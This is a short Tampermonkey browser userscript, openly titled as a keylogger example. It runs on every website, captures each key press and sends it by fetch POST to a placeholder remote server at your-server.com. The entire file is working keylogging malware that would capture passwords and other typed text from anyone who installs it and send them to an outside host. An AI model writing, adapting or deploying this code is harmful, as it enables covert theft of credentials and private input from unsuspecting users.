// ==UserScript==
// @name         Keylogger Example with Remote Logging
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Logs key presses and sends them to a remote server
// @author       FLGZX
// @match        *://*/*
// @grant        none
// ==/UserScript==
(function() {
    'use strict';
    const REMOTE_SERVER_URL = 'https://your-server.com/log_key';
    document.addEventListener('keydown', function(event) {
        const keyPressed = event.key;
        fetch(REMOTE_SERVER_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ key: keyPressed }),
        })
        .then(response => response.json())
        .then(data => {
            console.log('Server response:', data);
        })
        .catch((error) => {
            console.error('Error:', error);
        });
        console.log(`Key pressed: ${keyPressed}`);
    });
})();